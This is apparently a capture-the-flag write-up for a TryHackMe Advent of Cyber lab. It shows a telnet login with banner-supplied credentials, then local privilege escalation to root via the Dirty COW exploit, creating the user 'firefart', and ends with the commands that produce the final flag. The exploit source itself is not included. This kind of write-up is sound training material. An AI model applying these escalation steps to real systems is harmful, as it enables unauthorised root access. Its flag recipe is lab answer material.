use nmap to scan the server, you will se port 23 TELNET is open. let's connect to it
```console
$ telnet $IP  
Trying 10.10.145.194...
Connected to 10.10.145.194.
Escape character is '^]'.
HI SANTA!!! 

We knew you were coming and we wanted to make
it easy to drop off presents, so we created
an account for you to use.

Username: santa
Password: clauschristmas

We left you cookies and milk!

christmas login: santa
Password: 
Last login: Sat Nov 21 20:37:37 UTC 2020 from 10.0.2.2 on pts/2
                \ / 
              -->*<-- 
                /o\ 
               /_\_\ 
              /_/_0_\ 
             /_o_\_\_\ 
            /_/_/_/_/o\ 
           /@\_\_\@\_\_\ 
          /_/_/O/_/_/_/_\ 
         /_\_\_\_\_\o\_\_\ 
        /_/0/_/_/_0_/_/@/_\ 
       /_\_\_\_\_\_\_\_\_\_\ 
      /_/o/_/_/@/_/_/o/_/0/_\ 
               [___] 
```

I love John's Xmas tree <3
```bash
$ cat christmas.sh
#!/bin/bash
trap "tput reset; tput cnorm; exit" 2
clear
tput civis
lin=2
col=$(($(tput cols) / 2))
c=$((col-1))
est=$((c-2))
color=0
tput setaf 2; tput bold

# Tree
for ((i=1; i<20; i+=2))
{
    tput cup $lin $col
    for ((j=1; j<=i; j++))
    {
        echo -n \*
    }
    let lin++
    let col--
}

tput sgr0; tput setaf 3

# Trunk
for ((i=1; i<=2; i++))
{
    tput cup $((lin++)) $c
    echo "mWm"
}
new_year=$(date +"%Y")
let new_year++
tput setaf 1; tput bold
tput cup $lin $((c - 6)); echo "  TryHackMe"
tput cup $((lin + 1)) $((c - 10)); echo "  Advent of Cyber with John Hammond"
let c++
k=1

# Lights and decorations
while true; do
    for ((i=1; i<=35; i++)) {
        # Turn off the lights
        [ $k -gt 1 ] && {
            tput setaf 2; tput bold
            tput cup ${line[$[k-1]$i]} ${column[$[k-1]$i]}; echo \*
            unset line[$[k-1]$i]; unset column[$[k-1]$i]  # Array cleanup
        }

        li=$((RANDOM % 9 + 3))
        start=$((c-li+2))
        co=$((RANDOM % (li-2) * 2 + 1 + start))
        tput setaf $color; tput bold   # Switch colors
        tput cup $li $co
        echo o
        line[$k$i]=$li
        column[$k$i]=$co
        color=$(((color+1)%8))
        # Flashing text
        sh=1
        for l in C y b e r
        do
            tput cup $((lin+1)) $((c+sh))
            echo $l
            let sh++
            sleep 0.01
        done
    }
    k=$((k % 2 + 1))
done$ 
```
# dirty cow!!
follow the instructed in dirty.c. Compile the exploit, run it **BUT LEAVE THE PASSWORD EMPTY**. Telnet to the server again with new tab, and run `su firefart`
```console
$ su firefart
Password: 
firefart@christmas:/home/santa# whoami
firefart
firefart@christmas:/home/santa# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@christmas:/home/santa# 
```
seem like GRINCH left a message to us. let will it
```console
firefart@christmas:/home/santa# ls /root 
christmas.sh  message_from_the_grinch.txt
firefart@christmas:/home/santa# cat /root message_from_the_grinch.txt
cat: /root: Is a directory
cat: message_from_the_grinch.txt: No such file or directory
firefart@christmas:/home/santa# cat /root/message_from_the_grinch.txt
Nice work, Santa!

Wow, this house sure was DIRTY!
I think they deserve coal for Christmas, don't you?
So let's leave some coal under the Christmas `tree`!

Let's work together on this. Leave this text file here,
and leave the christmas.sh script here too...
but, create a file named `coal` in this directory!
Then, inside this directory, pipe the output
of the `tree` command into the `md5sum` command.

The output of that command (the hash itself) is
the flag you can submit to complete this task
for the Advent of Cyber!

	- Yours,
		John Hammond
		er, sorry, I mean, the Grinch

	  - THE GRINCH, SERIOUSLY
```
message from GRINCH (John) tell us how to get the last flag, so let create a file call coal using `touch`. to get the flag we run `tree` at `/root` and pipe it to `md5sum`
```
firefart@christmas:/home/santa# cd /root
firefart@christmas:~# touch coal
firefart@christmas:~# tree | md5sum
```